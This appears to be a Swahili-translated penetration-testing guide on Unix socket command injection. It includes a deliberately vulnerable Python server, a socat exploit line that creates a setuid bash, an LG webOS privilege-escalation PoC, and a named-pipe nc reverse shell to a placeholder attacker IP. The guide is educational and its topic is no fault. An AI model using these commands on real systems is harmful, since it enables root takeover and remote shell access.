# Socket Command Injection

## Mfano wa socket binding kwa Python

Katika mfano ufuatao **unix socket inaundwa** (`/tmp/socket_test.s`) na kila kitu **kinachopokelewa** kita-**executed** na `os.system`.Najua kwamba hutapata hii katika mazingira halisi, lakini lengo la mfano huu ni kuona jinsi code inayotumia unix sockets inavyoonekana, na jinsi ya kushughulikia input katika hali mbaya zaidi iwezekanavyo.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Tekeleza** code ukitumia python: `python s.py` na **chunguza jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Uchunguzi wa kesi: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Baadhi ya daemons zenye privileged huweka wazi UNIX socket inayomilikiwa na root, inayokubali input isiyoaminika na kuunganisha vitendo vya privileged na thread-IDs pamoja na signals. Ikiwa protocol inamruhusu client asiye na privileged kuathiri native thread itakayolengwa, huenda ukaweza ku-trigger code path ya privileged na kufanya escalation.<sup>[[1]](#references)[[2]](#references)</sup>

Maelezo makuu ya tukio na disclosure yanaeleza sequence ifuatayo.<sup>[[1]](#references)[[2]](#references)</sup>

Pattern iliyozingatiwa:
- Unganisha kwenye socket inayomilikiwa na root (kwa mfano, /tmp/remotelogger).
- Unda thread na upate native thread id (TID) yake.
- Tuma TID (ikiwa packed) pamoja na padding kama request; pokea acknowledgement.
- Tuma signal maalum kwa TID hiyo ili ku-trigger tabia ya privileged.

PoC iliyofupishwa hapa chini inaakisi sequence hiyo.<sup>[[1]](#references)[[2]](#references)</sup>
Muhtasari wa Minimal PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Ili kuligeuza hili kuwa root shell, pattern rahisi ya named-pipe + nc inaweza kutumika.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes:
- Aina hii ya bugs hutokana na kuamini values zinazotokana na hali ya client asiye na privileges (TIDs) na kuzihusisha na signal handlers au logic yenye privileges.<sup>[[1]](#references)</sup>
- Imarisha usalama kwa kutekeleza credentials kwenye socket, kuthibitisha formats za messages, na kutenganisha operations zenye privileges na thread identifiers zinazotolewa kutoka nje.

## References

- [1] [Jailbreak webOS kwa ajili ya burudani (kwa ajili ya burudani tu)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Path Traversal, Authentication Bypass na Full Device Takeover kwenye LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
